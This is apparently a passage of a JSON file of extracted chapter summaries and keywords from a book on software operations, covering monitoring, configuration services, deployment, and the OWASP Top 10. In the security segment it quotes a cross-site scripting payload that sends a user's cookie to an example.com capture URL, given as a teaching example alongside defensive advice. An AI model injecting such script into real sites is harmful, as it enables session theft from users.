      "address"
    ]
  },
  {
    "chapter_number": 25,
    "title": "Segment 25 (pages 200-207)",
    "start_page": 200,
    "end_page": 207,
    "summary": "If you can amortize the cost of a platform team across hundreds of services deployed hundreds of times per year, then it makes a lot more sense.\nNew open-source operations tools are released nearly every day.\nAt that time, automated provi- sioning of operating systems required either a large commercial package (six figures in license cost, six more in implementation cost) or a complete roll- your-own approach.\nAmazon, like other service providers, has learned that customer confidence can really be shaken with an event like this.\nAmazon clearly states that “[a]n authorized S3 team member using an established playbook executed a command which was intended to remove a small number of servers for one of the S3 subsystems that is used by the S3 billing process.\nThe administrative tools and playbooks allowed this error to happen.\n“System” here means the whole system—S3 plus the control plane software and human processes to manage it all.\n“While removal of capacity is a key operational practice, in this instance, the tool used allowed too much capacity to be removed too quickly.\nA common thread running through these outages is that the automation is not being used simply to enact the will of a human administrator.\nBut once we’re talking about shutting down more than 50 percent of total server capacity, the automation probably ought to pause for some human confirmation that this is really the right course of action.\nBy the time a human perceives the problem, it’s a question of recovery rather than intervention.\nWe should use automation for the things humans are bad at: repetitive tasks and fast response.\nWe should use humans for the things automation is bad at: perceiving the whole situation at a higher level.\nThere’ll surely be a monitoring team within the platform team.\nIn other words, the monitoring team doesn’t do the monitoring, it provides the ability for others to do their own monitoring.\nFor example, it used to be common for the monitoring team to implement all the specific monitors, triggers, alerts, and thresholds.\nIt means they have to create a “request for monitoring” form for development teams to\nIf we respect the customer-centric model, then the monitoring team should not implement the actual monitors.\nTeam members should work one level removed: they implement the tools that let their customers implement their own monitors.\nIn other words, the monitoring team may need to build infrastructure to receive alerts, deployment tools that push their monitoring agents out (if applicable), or scripting tools that let developers provide a JSON description of the monitors they need.\nThe monitoring team offers up an interface that development teams can use.\nThe details of implementation are owned by the monitoring team and can change as long as they continue to support their contract.\nThe administrator should ideally be concerned with creating a high-performance, stable platform on which development teams can build any kind of database.\nSadly, technology constraints in days past led us to have DBAs that were responsible for both the health of the database server and the data model used by the applications.\nThe platform team includes database administrators who keep the database running and healthy.\nThe picture is harder with SQL-based RDBMSs. It’s too easy for one application to make a harmful schema change that affects other consumers.\nIt’s not very resource-efficient, but it does unfreeze development teams to move indepen- dently, without a queue for DBA attention.\nDevelopment Is Production • 199\nThe team should be trying to take themselves out of the loop on every day- to-day process and focus on building safety and performance into the platform itself.\nIf you find that your technology choices or architecture make this really difficult, it’s a good argument to change your technology!\nDo you have high confidence that passing tests in QA means the software will work in production?\nMaybe your image of QA is a whole environment stamped out by the same automation tools that deploy to production, with an anonymized sample of production data from within the last week.\nQA doesn’t match produc- tion in topology or scale, and multiple dev teams are trying to get into QA but can’t because there’s only one environment.\nVirtualize them so every team can create its own on- demand QA environment.) In short, development environments are treated with utter disregard.\nThis is kind of odd when you think about it, because developers are creating content all the time.\nThey build software that has to go into version control (a service), get constructed in CI (another service), tested in QA (a service), and stored in a repository (yet another service).\nWhen these services are down, developers can’t do their jobs.\nThe tools, services, and environments that developers need to do their jobs should be treated with production-level SLAs. The development platform is the production environment for the job of creating software.\n(It would require a model of the whole system that accounts for circuit breakers, caches, fallbacks, and a pile of other implemen- tation details that change frequently.) Instead, the best way to tell if users are receiving a good experience is to measure it directly.\nThat can take a lot of infrastructure, so you may consider a service such as New Relic or Datadog.3,4 If you are at a scale where it makes sense to run it yourself, on-premise software such as AppDy- namics or CA’s APM might be the thing for you.5,6 Some of these products also allow you to watch network traffic at the edge of your system, recording HTTP sessions for analysis or playback.\nwww.ca.com/us/products/application-performance-monitoring.html\nYou don’t need to build infrastructure or configure monitoring software.\nSecond, they offer agents and connectors for a wide array of technology, which makes it much easier to integrate all your monitoring into one place.\nOn-premise commercial solutions, such as AppDynamics, offer easy integration and polished visualization, but these lose the advantage of rapid startup and also have scaling fees.\nWhile removing the very visible monthly fees for a service, the open source approach has less-visible costs in the form of labor and infrastructure.\nHalf of the vendors at operations or software architecture conferences are in this space, so the names may change by the time you read this.\nThe broad category here is called “application performance management,” and it seems to be one of the last areas of operations software that hasn’t been replaced by open-source packages.\nAs with other kinds of operations software, it’s not that important to choose the ideal solution.",
    "keywords": [
      "monitoring team",
      "n’t",
      "monitoring",
      "team",
      "Control Plane",
      "System",
      "software",
      "service",
      "platform team",
      "report erratum",
      "tools",
      "cost",
      "development teams",
      "Mechanical Advantage",
      "database"
    ],
    "concepts": [
      "human",
      "humans",
      "automated",
      "automation",
      "operate",
      "operational",
      "operating",
      "operators",
      "operation",
      "database"
    ]
  },
  {
    "chapter_number": 26,
    "title": "Segment 26 (pages 208-215)",
    "start_page": 208,
    "end_page": 215,
    "summary": "Is some service in a revenue-generating process throwing exceptions in logs?\nCost comes from infrastructure, especially in these days of autoscaled, elastic, pay-as- you-go services.\nBefore you do, though, make sure it’s a service that makes a difference.\nIn other words, your feature that detects birds in photographs taken inside national parks may require a lot of CPU time; but if it only gets used once a month, it’s not material to your bottom line.\nAre there opportunities to increase the bottom line by optimizing services?\nThe “technical” perspective may even be split into “development” and “operations.” Most of the time, these constituencies look at different measure- ments collected by different means.\nImagine the difficulty in planning when marketing uses tracking bugs on web pages, sales uses conversions reported in a business intelligence tool, operations analyzes log files in Splunk, and development uses blind hope and intuition.\nIn Transparency, on page 162, we saw the importance of good logging and metrics generation at the microscopic scale.\nLike a lot of these tools, log collectors can either work in push or pull mode.\nPush mode means the instance is pushing logs over the network, typically with the venerable syslog protocol.7 Push mode is quite helpful with containers, since they don’t have any long-lived identity and often have no local storage.\nWith a pull-mode tool, the collector runs on a central machine and reaches out to all known hosts to remote-copy the logs.\nIn this mode, services just write their logs to local files.\nThat’s why metrics collectors often come with additional tools to take measurements on the instances.\nSecond, even if you guess right, the key metrics change over time.\nState of circuit breaker, number of timeouts, number of requests, average response time, number of good responses, number of network errors, number of protocol errors, number of application errors, actual IP address of the remote endpoint, current number of concurrent requests, concurrent request high-water mark\nItems in cache, memory used by cache, cache hit rate, items flushed by garbage collector, configured upper limit, time spent creating items\nFor continuous metrics, a handy rule-of-thumb definition for nominal would be “the mean value for this time period plus or minus two standard deviations.” The choice of time period is where it gets interesting.\nConfiguration Services\nConfiguration services like ZooKeeper and etcd are distributed databases that applications can use to coordinate their configuration.9,10 Configuration in this sense is more than just the static parameters that an instance would keep in .properties files.\nThe configuration services are themselves distributed databases.\nProvisioning and Deployment Services • 207\nKeep in mind that the configuration service suffers the same network trauma that every other application does.\nThere will be times that clients can’t reach the configuration service.\nWorse, there will be times when the nodes of the configuration service can’t reach each other but clients can reach the nodes.\nOtherwise, you have no choice but to shut down applications when the configuration service is partitioned.\nInformation doesn’t only need to flow from the service to client instances, either.\nBe somewhat careful with this, as the configuration services can sustain high read volume but have to go through some consensus mechanism for every write.\nIt’s OK to use these for relatively slowly changing configuration data, but they definitely don’t stand in for a log collection system.\nA few pointers about configuration services:\nMake sure your instances can start without the configuration service.\nMake sure your instances don’t stop working when configuration is\nProvisioning and Deployment Services\nIn many organizations deploy- ment is ridiculously painful, so it’s a good place to start making life better.\nA push-style tool uses SSH or another agent so a central server can reach out to run scripts on the target machines.\nIn contrast, pull-based deployment tools rely more on the machines to know their own roles.\nSoftware on the machine reaches out to a configuration service to grab the latest bits for its role.\nCanary deployments are an important job of the build tooling.\nFor a period of time, the instances running the new build coexist with instances running the old build.\n(See Chapter 14, Handling Versions, on page 263, to enable peaceful coexistence.) If the canary instances behave oddly, or their metrics go south, then the build is not rolled out to the remaining population.\nAt a larger scale, the deployment tool needs to interact with another service to decide on placement.\nThat placement service will determine how many instances of a service to run.\nWhen you get to this scale, it’s probably time to look at the platform players.\nLive control is only necessary if it takes your instances a long time to be ready to run.\nIf your instances run in containers and get their configuration from a config- uration service, then that is exactly the world you live in.\nSadly, not every service is made of instances that start up so quickly.\nMany services need to hold a lot of data in cache before they perform well enough.",
    "keywords": [
      "configuration service",
      "Configuration",
      "time",
      "Number",
      "service",
      "services",
      "instances",
      "Services Configuration services",
      "build",
      "Configuration Services Configuration",
      "top line",
      "metrics",
      "line",
      "system",
      "n’t"
    ],
    "concepts": [
      "tools",
      "tool",
      "tooling",
      "time",
      "times",
      "number",
      "numbers",
      "service",
      "services",
      "build"
    ]
  },
  {
    "chapter_number": 27,
    "title": "Segment 27 (pages 216-223)",
    "start_page": 216,
    "end_page": 223,
    "summary": "Control Plane • 210\nIn those cases, you need to look at ways to send control signals to running instances.\nNot every service will need all of these controls.\nMany services also expose controls to update the database schema, or even to delete all data and reseed it.\nDevelopers don’t trust operations to deploy the software and run the scripts correctly.\nOperations doesn’t allow developers to log in to the production machines to update the schemata.\nOnce you’ve decided which controls to expose, there’s still the question of how to convey the operator’s intention out to the instances themselves.\nEach instance of a service would listen on a port for these requests.\nIn the beginning, it’s fine to use cURL or any other HTTP client to poke the admin API.\nCommand and Control • 211\nFor one thing, it takes time to make the API call to each instance.\nMore likely, whatever script loops over those API calls will stall out partway through because some instance doesn’t respond.\nThat’s when it’s time to build a “command queue.” This is a shared message queue or pub/sub bus that all the instances can listen to.\nThe admin tool sends out a command that the instances then perform.\nGUIs slow down operations by forcing administrators to do the same manual process on each service or instance (there might be many) every time the process is needed.\nThe net result is that GUIs make terrible administrative interfaces for long- term production operation.\nGiven a command line, operators can easily build a scaffolding of scripts, logging, and automated actions to keep your software happy.\nControl Plane • 212\nUse configuration, provisioning, and deployment services to gain leverage over larger or more dynamic systems.\nIt is the production environment that developers use to produce value.\nOnce the system is (somewhat) stabilized and problems are visible, build control mechanisms.\nThese should give you more precise control than just reconfiguring and restarting instances.\nA large system deployed to long-lived machines benefits more from control mechanisms than a highly dynamic environment will.\nThe platform is to the data center what the operating system is to the personal computer.\nThat also means that individual teams probably don’t have the capacity or authority to build their own platforms.\nWhen these platforms work well, it can be an amazingly smooth experience to deploy services.\nDon’t try to wrap the API or provide your own set of scripts.\nRemember that not every organization needs everything on this list.\nLog collection and search • Metrics collection and visualization • Deployment • Configuration service • Instance placement • Instance and system visualization • Scheduling • IP, overlay network, firewall, and route management • Autoscaler • Alerting and notification\nControl Plane • 214\nTo answer those, we need to collect information across instances and services.\nControl systems and configuration services allow us to instruct running instances to change their behavior.\nScheduling and deployment tools let us change the instance assortment dynamically as our internal and external environments shift.\nIn all these services, we need to understand that automation makes every- thing go faster.\nWe need to build safety mechanisms into the automation itself.\nSecurity • 216\nIn this chapter, we’ll look at the “top ten” list of application vulnerabilities, as identified by the Open Web Application Security Project (OWASP).\nSince 2001, the OWASP Foundation has catalogued application security incidents and vulnerabilities.5 Its member organizations contribute data from real attacks, so these are real lessons rather than “what-if-isms.” One way that OWASP promotes application security awareness is through its OWASP Top 10 list.\nThe OWASP Top 10 • 217\nOther databases are also vulnerable to injection attacks.\nIn general, if a service builds queries by bashing strings together and any of those strings come from a user, that service is vulnerable.\nAnother common vector for injection attacks is XML.\nOne XML-based attack is the XML external entity (XXE) injection.\nBut did you know that XML allows any document to define new entities?\nMost XML parsers are vulnerable to XXE injection by default.\nwww.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet",
    "keywords": [
      "API",
      "admin API",
      "Control",
      "instances",
      "instance",
      "XML",
      "n’t",
      "Control Plane",
      "Injection",
      "report erratum",
      "security",
      "system",
      "OWASP SQL Injection",
      "OWASP",
      "SQL injection"
    ],
    "concepts": [
      "security",
      "control",
      "controls",
      "api",
      "instances",
      "instance",
      "data",
      "tool",
      "tools",
      "report"
    ]
  },
  {
    "chapter_number": 28,
    "title": "Segment 28 (pages 224-231)",
    "start_page": 224,
    "end_page": 231,
    "summary": "It can be as obvious as putting a session ID into URLs or as subtle as storing unsalted passwords in your user database.\nAt one time, it was common to use query parameters on URLs and hyperlinks to carry session IDs. Not only are those session IDs visible to every switch, router, and proxy server, they are also visible to humans.\nThe email included a deep link to the product page, including the marketer’s session ID.\nThousands of random users tried to use that same session.\nBut any session ID in plain text can be sniffed and duplicated by an attacker.\nThe attacker gains control of the user’s session.\nIt can still happen, however, even if the session ID is embedded in a cookie.\nSessions can also be compromised via cross-site scripting (XSS) attacks, which we’ll look at a little bit later.\nA variant of session hijacking is “session fixation.” An attacker goes to the vulnerable application and gets issued a valid session ID.\nThe attacker then\nsupplies the target with a link to the application with the attacker’s session ID in it.\n(It may be provided to the victim several ways, including client-side script or the META tag to set a cookie.) The receiving application accepts the session ID from the victim and generates a response within that session.\nFrom this point on, the victim uses a session that the attacker can access at any time.\nThe attacker expects the user to authenticate the session, which grants both the victim and the attacker full access.\nIf your session IDs are generated by any kind of predictable process, then your service may also be vulnerable to a “session prediction” attack.\nThis occurs when an attacker can guess or compute a session ID for a user.\nAny session IDs based on the user’s own data are definitely at risk.\nJust because a session ID looks random doesn’t mean that it is random, though.\nAny algorithm used by the server that generates the ID is probably open source and available for the attacker to download too.\nUse a long session ID with lots of entropy.\nGenerate session IDs using a pseudorandom number generator (PRNG) with good cryptographic properties.\nProtect against XSS to avoid script execution that would reveal session IDs.\nWhen a user authenticates, generate a fresh session ID.\nThat way, if a session fixation attack occurs, the attacker will not have access to the user’s account.\nUse cookies to exchange session IDs. Do not accept session IDs via other mechanisms.\nSome servers will emit session IDs in cookies but still accept them via query parameters.\n(Be honest, could you write a cURL command for a TLS-secured call to a development server using a self- signed certificate?) Consequently, we often write web services that use HTTP instead of HTTPS.\nUse “salt,” which is some random data added to the password to make dictionary attacks harder.\nDon’t allow attackers to make unlimited authentication attempts.\nCross-site scripting (XSS) happens when a service renders a user’s input directly into HTML without applying input escaping.\n<input type='text' value=''> <script>document.location='http://www.example.com/capture?id='+ document.cookie</script>'' />\nWhen the client’s browser hits the script tag in the middle, it makes a request over to www.example.com with the user’s cookie as a parameter, allowing the attacker to hijack the user’s session.\nA whole class of injection attacks aim at administrator or customer service GUIs. These attacks work through the browser.\nThe attacker injects script into your system, which then executes on your users’ browsers to attack a different party entirely.\nBroken access control refers to application problems that allow attackers to access data they shouldn’t.\nThis can include other users’ data or system- level data like password files.\nOne of the common forms of broken access control is “direct object access.” This happens when a URL includes something like a database ID as a query parameter.\nAn attacker sees the ID in the query parameter and starts probing for other numbers.\nSince database IDs are assigned sequentially, it’s easy for an attacker to scan for other interesting data.\nAn attacker can start trying other customer IDs to see what goods are en route.\nFirst, don’t use database IDs in URLs. We can generate unique but non-sequential identifiers to use in URLs. In that case, an attacker can probe the ID space but will have low odds of finding interesting results.\nYet another approach is to use a session-specific mapping from random IDs to real IDs. This uses more memory, but it avoids the extra storage needed for randomized IDs. When a user makes a request for http://www.example.com/pro- files/1990523, the service looks up that number in the session-scoped map.\nThis prevents attackers from probing for other users’ data.\nIf a resource should only be sent to authorized callers, your service must make that check on every request.\nSuppose your service responds with a “404 Not Found” when a caller requests a resource that doesn’t exist, but responds with a “403 Authentication Required” for a resource that exists but isn’t authorized.\nThen an attacker could find out how many customers you have by making requests for customer 1, 2, 3, and so on.\nOr, an attacker could probe your login service with different email addresses harvested from the web.\nAttackers have entered applications, network devices, and databases by using the default, out-of-the-box admin login.",
    "keywords": [
      "Session",
      "session IDs",
      "attacker",
      "user",
      "n’t",
      "service",
      "OWASP Top",
      "IDs",
      "Authentication",
      "XSS",
      "OWASP",
      "access",
      "OWASP XXE Prevention",
      "data",
      "Security"
    ],
    "concepts": [
      "attacks",
      "attacker",
      "attack",
      "attackers",
      "attacking",
      "session",
      "sessions",
      "service",
      "services",
      "security"
    ]
  },
  {
    "chapter_number": 29,
    "title": "Segment 29 (pages 232-239)",
    "start_page": 232,
    "end_page": 239,
    "summary": "Maybe your system uses TLS at the edge but REST over plain HTTP internally— another “pie crust.” An attacker can sniff the network to collect credentials and payload data.\nUse HTTP Strict Transport Security.\nMake sure sensitive data is encrypted in the database.\nApplications can request data encryption keys, which they use to encrypt or decrypt data.\nUse the tool fully as part of a holistic secure development process.\nThat includes well-formed requests for unauthorized data, and it includes malformed requests aimed at compro- mising the service itself.\nThat allows an attacking program to keep making calls, either to probe for weaknesses or extract data.\nThat leaves the attacker free to keep issuing requests.\nThe service should log bad requests by source principal.\nIn the case of an attack, it slows the rate of data compro- mise, thereby limiting the damage.\nCross-site request forgery (CSRF) used to be a bigger issue than it is now.\nA CSRF attack starts on another site.\nAn attacker uses a web page with JavaScript, CSS, or HTML that includes a link to your system.\nWhen the hapless user’s browser accesses your system, your system thinks it’s a valid request from that user.\nJust because the user appears to have a logged-in session doesn’t mean the request is intentional.\nThe first thing to do is make sure your site can’t be used to launch CSRF attacks.\nSecond, make sure that requests with side effects—such as password changes, mailing address updates, or purchases—use anti-CSRF tokens.\nA top-level navigation request (an in-bound link from another system) on a new page is not a same- site request when the cookie says “strict.”\nSadly, most successful attacks are not the exciting “zero day, rush to patch before they get it” kind of thing that makes those cringe-worthy scenes in big budget thrillers.\nThey can also have vulnerabilities.) Keep that report someplace and check it once a week against the latest CVEs. Better yet, use a build tool plugin that automatically breaks the build if there’s a CVE against any of your dependencies.20 If that’s too much work, you can sign up for a commercial service like VersionEye.21\nwww.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet 19.\nIt’s essential to make sure that APIs are not misused.\nWell, attack tools are also programs.\nIf an attack tool presents the right credentials and access tokens, it’s indistinguishable from a legitimate user.\nIf the attacker can use those to get other customers’ data, that’s catastrophic.\nAPIs must ensure that malicious requests cannot access data the original user would not be able to see.\nFor instance, your API absolutely cannot use hyperlinks as a security measure.\nThe upshot is that the API has to authorize the link on the way out and then reauthorize the request that comes back in.\nSecond, your API should use the most secure means available to communicate.\nUse a generative testing library to feed it tons and tons of bogus input to make sure it rejects the input or fails in a safe way.\n(This particular package also was not able to run as a Windows service, so it was essentially just a Windows desktop application left running for a long time.\nOnce an attacker has cracked the shell to get root access, the only way to be sure the server is safe is to reformat and reinstall.\nTo further contain vulnerabilities, each major application should have its own user.\nSome containerized applications run a whole init system inside the container, allowing multiple shells and processes.\nSadly, patch management tools don’t know how to deal with contain- ers right now.\nPasswords are the Brazil nut of application security; every mix has them, but nobody wants to deal with them.\nThere’s obviously no way that somebody can interactively key in passwords every time an application server starts up.\nTherefore, database passwords and credentials needed to authenticate to other systems must be configured in persistent files somewhere.\nAs soon as a password is in a text file, it is vulnerable.\nAny password that grants access to a database with customer information is worth thousands of dollars to an attacker and could cost the company thousands in bad pub- licity or extortion.\nThese passwords must be protected with the highest level of security achievable.\nAt the absolute minimum, passwords to production databases should be kept separate from any other configuration files.\n(I’ve seen operations zip up the entire installation folder and ship it back to development for analysis, for example, during a support incident.) Files containing passwords should be made readable only to the owner, which should be the application user.\nIf the application is written in a language that can execute privilege separation, then it’s reasonable to have the application read the password files before downgrad- ing its privileges.\nPassword vaulting keeps passwords in encrypted files, which reduces the security problem to that of securing the single encryption key rather than securing multiple text files.\nAWS Key Management Service (KMS) is useful here.\nWith KMS, applications use API calls to acquire decryption keys.\nThat way the encrypted data (the database passwords) don’t sit in the same storage as the decryption keys!\nIf the application keeps the keys or passwords in memory, then memory dumps will also contain them.\nAn attacker that can provoke a core dump can get the passwords.\nThis dump file can be analyzed with Microsoft kernel debugging tools; and depending on the configuration of the server, it can contain a copy of the entire physical memory of the machine—passwords and all.\nThe most common target of value is user data, especially credit card informa- tion.",
    "keywords": [
      "n’t",
      "Data",
      "requests",
      "passwords",
      "system",
      "API",
      "APIs",
      "application",
      "user",
      "request",
      "Service",
      "Security",
      "make",
      "attacker",
      "report erratum"
    ],
    "concepts": [
      "data",
      "attack",
      "attacker",
      "attackers",
      "attacking",
      "attacks",
      "user",
      "users",
      "security",
      "secure"
    ]
  },
  {
    "chapter_number": 30,
    "title": "Segment 30 (pages 240-247)",
    "start_page": 240,
    "end_page": 247,
    "summary": "In the next part, we will look at the moment of truth: deployment!\nNothing is done until it runs in production.\nOne of the SQL scripts didn’t work right, but he “fixed” it by run- ning it under a different user ID.\nThe playbook has a row that says SQL scripts finish at 11:50 p.m. We’re still on the SQL scripts, so logically we’re still at 11:50 p.m. Before dawn, we need our playbook time and solar time to converge in order for this deployment to succeed.\nSomewhere on the first page of the playbook we had a go/no-go meeting at 3 p.m. Everyone gave the deployment a go, although QA said that they hadn’t finished testing and might still find a showstopper.\nAfter the go/no-go meeting, an email went out to the business stakeholders, announcing that the deployment would go forward.\nI don’t know how long I’ll have to wait, but somehow I’m sure the clock will still say 1:17.\nIn a release a couple of years ago, those numbers went the wrong way.\nTwo days ago, we started reviewing and updating the playbook.\nPlease say it worked.” An equal number of people are dialed in to the same conference bridge from four locations around the world.\nThat’s my cue: I am Sys Ops. It’s not as cool as saying, “I am Iron Man.” The term “DevOps” won’t exist for another year, and in a different galaxy than this conference room.\nIt updates a symbolic link to point to the new code drop, runs the JSP pre- compiler, and starts the server processes.\nAfter some fruitful contemplation on the nature of the buzz produced by fluorescent lights (and that the pitch must be different in countries on 50 hertz power), I start to wonder how much this deployment costs.\nIt’s about $100,000 to run this deployment.\nYears later, I would witness a deployment at the online retailer Etsy.\nAt the same time, I had a deep sense of loss: all that time in the deployment army.\nIn the end, our deployment failed UAT.\nYou may have a deployment army of your own.\nDesign for Deployment\nIn the last chapter, we were stuck in a living nightmare, one of many endless deployments that waste countless hours and dollars.\nNow we turn to sweeter dreams as we contemplate automated deployments and even continuous deployments.\nGiven the diversity of virtualization and deployment options we have now, words like server, service, and host have gotten muddy.\nWe have more ways to run software in production than ever.\nDesign for Deployment • 242\nThat means we shouldn’t plan for one or a few deployments to production, but many upon many.\nOnce upon a time, we wrote our software, zipped it up, and threw it over the wall to operations so they could deploy it.\nReleases should be like what Agent K says in Men in Black: “There’s always an Arquillian Battle Cruiser, or Corillian Death Ray, or intergalactic plague, [or a major release to deploy], and the only way users get on with their happy lives is that they do not know about it!”\nMost of the time, we design for the state of the system after a release.\nWe can pull it off by designing our applications to account for the act of deployment and the time while the release takes place.\nIn other words, we don’t just write for the end state and leave it up to operations to figure out how to get the stuff running in production.\nWe treat deployment as a feature.\nThe remainder of this chapter addresses three key concerns: automation, orchestration, and zero-downtime deployment.\nAutomated Deployments\nOur goal in this chapter is to learn how we need to design our applications so that they’re easy to deploy.\nThis section describes the deployment tools themselves to give us a baseline for understanding the design forces they impose.\nThis overview won’t be enough for you to pick up Chef and start writing deployment recipes, but it will put Chef and tools like it into context so we know what to do with our ingredients.\nAutomated Deployments • 243\n(Some teams like to build every commit to master; others require a particular tag to trigger a build.) In some ways, the build pipeline is an overgrown continuous integration (CI) server.\nIt starts exactly like CI with steps that cover development concerns like unit tests, static code analysis, and compilation.\nWhere CI would stop after publishing a test report and an archive, the build pipeline goes on to run a series of steps that culminate in a production deployment.\nThis includes steps to deploy code into a trial environment (either real or virtual, maybe a brand-new virtual environment), run migration scripts, and perform integration tests.\ndeploy\nJenkins is probably the most commonly used today.1 I also like Thoughtworks’ GoCD.2 A number of new tools are vying for this space, including Netflix’s Spinnaker",
    "keywords": [
      "deployment",
      "n’t",
      "release",
      "build",
      "report erratum",
      "time",
      "build pipeline",
      "playbook",
      "report",
      "production",
      "run",
      "System",
      "n’t work",
      "clock",
      "pipeline"
    ],
    "concepts": [
      "deployment",
      "deployments",
      "deploy",
      "release",
      "releases",
      "likely",
      "different",
      "report",
      "reporting",
      "reports"
    ]
  },
  {
    "chapter_number": 31,
    "title": "Segment 31 (pages 248-255)",
    "start_page": 248,
    "end_page": 255,
    "summary": "Design for Deployment • 244\nAt the tail end of the build pipeline, we see the build server interacting with one of the configuration management tools that we first saw in Chapter 8, Processes on Machines, on page 155.\nInstead of describing the specific actions to take, as a shell script would, these files describe a desired end state for the machine or service.\nThe tool’s job is to figure out what actions are needed to make the machine match that end state.\nConfiguration management also means mapping a specific configuration onto a host or virtual machine.\nWith manual assignment, the operator tells the tool what each host or virtual machine must do.\nInstead, the operator supplies a configuration that says, “Service X should be running with Y replicas across these locations.” This style goes hand-in-hand with a platform-as-a-service infrastructure, as shown in the figure on page 245.\nAutomated Deployments • 245\nBecause the services can be running on any number of different machines with different IP addresses, the platform must also configure the network for load balancing and traffic routing.\nThis “convergence” approach says the deployment tool must examine the current state of the machine and make a plan to match the desired state you declared.\nUnder the immutable infrastructure approach that we first encountered in Immutable and Disposable Infrastructure, on page 158, the unit of packaging is a virtual machine or container image.\nA machine instance created from an AMI can interrogate its environment to find out the “user data” supplied at launch time.\nDesign for Deployment • 246\nSuppose a machine has been around a while, a survivor of many deployments.\nIf not, at least testing and debugging the recipes is straightforward because you only have to account for one initial state rather than the stucco- like appearance of a long-lived machine.\nWhen changes are needed, you update the automation scripts and build a new machine.\nConvergence is more common in physical deployments and on long-lived vir- tual machines and manual mapping.\nAs the time from check-in to production increases, more changes accumulate in the deployment.\nContinuous Deployment • 247\ncontinuously.” For deployments, it means run the full build pipeline on every commit.\nSome teams trigger the final production deployment automatically.\nOthers have a “pause” stage, where some human must provide positive affirmation that “yes, this build is good.” (Worded another way, it says, “Yes, you may fire me if this fails.”) Either approach is valid, and the one you choose depends greatly on your organization’s context: if the cost of moving slower exceeds the cost of an error in deployment, then you’ll lean toward automatic deployment to production.\nDesign for Deployment • 248\nPhases of Deployment\nA deployment in a PHP application can be as simple as copying some files onto a production host.\nThese applications will take a long time to copy onto the target machine and then a large runtime process to restart.\nAt the extreme end of the spectrum, we have applications that are deployed as whole virtual machine images.\nWe can relate that grain size to the time needed to update a single machine.\nWe must account for this when rolling a deployment out to many machines.\nIt’s no good to plan a rolling deployment over a 30-minute window only to discover that every machine needs 60 minutes to restart!\nAs we roll out a new version, both the macroscopic and microscopic time scales come into play.\nThe microscopic time scale applies to a single instance (host, virtual machine, or container).\nPhases of Deployment • 249\nDeployment\nFor immutable infrastructure, this is the time needed to deploy a new image.\nOn the other hand, if your deployment requires you to manually copy archives or edit configuration files, this can take a while.\nFinally, once you start the new release on a particular machine, how long is it before that instance is ready to receive load?\nSend load to a machine that isn’t open for business yet, and you’ll either see server errors or very long response times for those requests unlucky enough to be the first ones through the door.\nDesign for Deployment • 250\nDuring this time the old version is still running everywhere, but it’s safe to push out new content and assets (as long as they have new paths or URLs).\nOnce we think about a deployment as a span of time, we can enlist the application to help with its own deployment.\nThat way, the application can smooth over the things that normally cause us to take downtime for deploy- ments: schema changes and protocol versions.\n• Copy existing data into new tables or columns.\nPhases of Deployment • 251\nIn deployments, a shim is a bit of code that helps join the old and new versions of the application.\nAs shown in the figure that follows, in the preparation phase, you add the new table.\nFor instance, an INSERT trigger on the old table can extract the proper fields and also insert them into the new table.\nSimilarly, an UPDATE trigger on the new table can issue an update to the old table as well.",
    "keywords": [
      "Deployment",
      "machine",
      "time",
      "virtual machine",
      "Machines",
      "application",
      "n’t",
      "tool",
      "state",
      "host",
      "files",
      "virtual machine images",
      "Machine Images",
      "Attr",
      "add"
    ],
    "concepts": [
      "machines",
      "machine",
      "deployment",
      "deployments",
      "deployed",
      "deploy",
      "application",
      "applications",
      "time",
      "times"
    ]
  },
  {
    "chapter_number": 32,
    "title": "Segment 32 (pages 256-265)",
    "start_page": 256,
    "end_page": 265,
    "summary": "Will all the old documents work on the new version of your application?\nI mean all the old documents, way back to the very first customer record you ever created.\nChances are your application has evolved over time, and old versions of those documents might not even be readable now.\nHarder still, your database may have a patchwork of documents, all created using different application versions, with some that have been loaded, updated, and stored at different points in time.\nFirst, write your application so it can read any version ever created.\nWith each new document version, add a new stage to the tail end of a “translation pipeline” like the one shown in the figure on page 253.\nIt needs to be brought up-to-date, which is why the version 2 reader is configured to inject the document into the pipeline via the “version 2 to version 3 translator.” Each translator feeds into the next until the document is completely current.\nThe second read will detect the current version and need zero translations.\nAll the version permutations must be covered by tests, which means keeping old documents around as seed data for tests.\nThe second approach is to write a migration routine that you run across your entire database during deployment.\nInstead, the application must be able to read the new document version and the old version.\n1. An old instance reads an old document.\n2. A new instance reads an old document.\n3. A new instance reads a new document.\n4. An old instance reads a new document.\nFor this reason, it would be best to roll out the application version before running the data migration.\nI call it “trickle, then batch.” In this strategy, we don’t apply one massive migration to all documents.\nRather, we add some conditional code in the new version that migrates docu- ments as they are touched, as shown in the figure on page 255.\nThis adds a bit of latency to each request, so it basically amortizes the batched migration time across many requests.\n(After all, the deployment finished days or weeks ago.) Once the batch migration is done, you can even push a new deployment that removes the conditional check for the old version.\nIt allows rapid rollout of the new application version, without downtime for data migration.\nIt takes advantage of our ability to deploy code without disruption so that we can remove the migration test once it’s no longer needed.\nIn today’s applications, front-end asset versions are very tightly coupled to back-end application changes.\nBut when the time comes to deploy an application change, we actually do need the browser to fetch a new version of the script.\nSome cache busting libraries work by adding a query string to the URL, just enough to show a new version.\nThat allows me to have both the old and new versions sitting in different directories.\nThen you might encounter this issue: The browser gets the main page from an updated instance, but gets load-balanced onto an old instance when it asks for a new asset.\nThe old instance hasn’t been updated yet, so it lacks the new assets.\n2. Deploy all the assets to every host before you begin activating the new code.\nThis does mean you’re not using the “immutable” deployment style, because you have to modify instances that are already running.\nIt’s time to turn our attention to the actual rollout of new code.\nThe time has come to roll the new code onto the machines.\nLet’s start by considering a “convergence” style infrastructure with long-lived machines that get changes applied to them.\nA good health check page reports the application version, the runtime’s version, the host’s IP address, and the status of connection pools, caches, and circuit breakers.\nWith this kind of health check, a simple status change in the application can inform the load balancer not to send any new work to the machine.\nBoth the old and new versions are running at the same time.\nTo roll code out here, we don’t change the old machines.\nInstead we spin up new machines on the new version of the code.\nAs the new machines come up and get healthy, they will start taking load.\nThis means that you need session stickiness, or else a single caller could bounce back and forth from the old version on differ- ent requests.\nStarting a new cluster is more like the next figure.\nHere the new machines can be checked for health and well-being before switching the IP address over to the new pool.\nWith very frequent deployments, you are better off starting new machines in the existing cluster.\nNo matter how you roll the code out, it’s true under all these models that in- memory session data on the machines will be lost.\nEvery machine should be on the new code now.\nDon’t swing into cleanup mode until you’re sure the new changes are good.\nWay back in the preparation phase (probably ten minutes ago in real time, or eighteen hours by the playbook from last chapter), we applied the database 